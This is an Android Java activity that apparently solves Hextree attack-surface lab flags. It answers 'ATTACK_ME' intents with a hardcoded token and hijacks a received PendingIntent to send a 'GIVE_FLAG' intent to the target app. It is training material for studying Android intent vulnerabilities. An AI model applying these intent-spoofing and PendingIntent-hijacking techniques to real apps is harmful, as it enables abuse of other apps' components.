package com.sntrain.kribas.hextree1;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcelable;
import android.util.Log;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class HextreeReceivingActivity extends AppCompatActivity {


    private <T extends Parcelable> T getTypedParcelableExtra(Intent receivedIntent, String extraKey, Class<T> parcelableClass) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return receivedIntent.getParcelableExtra(extraKey, parcelableClass);
        } else {
            T parcelableExtra = (T) receivedIntent.getParcelableExtra(extraKey);
            return parcelableExtra;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_receiving);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        Intent receivedIntent = getIntent();
        //
        if (receivedIntent.getAction() != null && receivedIntent.getAction().equals("io.hextree.attacksurface.ATTACK_ME")){
            ComponentName callingActivity = getCallingActivity();
            if (callingActivity != null){
                Log.v("HextreeReceivingActivity","Called from:"+callingActivity.getClassName());
                if ( callingActivity.getClassName().contains("Flag11")) {
                    Log.v("HextreeReceivingActivity","Flag11");
                    //Flag11Activity
                    Intent response = new Intent();
                    response.putExtra("token", 1094795585);
                    setResult(RESULT_OK, response);
                }else if (callingActivity.getClassName().contains("Flag12")) {
                    Intent response = new Intent();
                    response.putExtra("token", 1094795585);
                    //response.putExtra("LOGIN", false);
                    setResult(RESULT_OK, response);
                }
            }else {
                    String flag = receivedIntent.getStringExtra("flag");
                    Log.d("HextreeReceivingActivity", "Flag: " + flag);
                    ((TextView) findViewById(R.id.receivedTextView)).setText(flag);
                }

        } else if (receivedIntent.getAction() != null && receivedIntent.getAction().equals("io.hextree.attacksurface.MUTATE_ME")) {
            PendingIntent pendingIntent = null;
            pendingIntent = getTypedParcelableExtra(receivedIntent, "pending_intent", PendingIntent.class);

            Intent intent2 = new Intent();
            intent2.setAction("io.hextree.attacksurface.GIVE_FLAG");
            intent2.putExtra("code",42);
            try {
                pendingIntent.send(this,42,intent2);
            } catch (PendingIntent.CanceledException e) {
                throw new RuntimeException(e);
            }

        }
        //((TextView)findViewById(R.id.receivedTextView)).setText(receivedIntent.getStringExtra(Intent.EXTRA_TEXT) !=null?receivedIntent.getStringExtra(Intent.EXTRA_TEXT):"Noting Received");

    }
}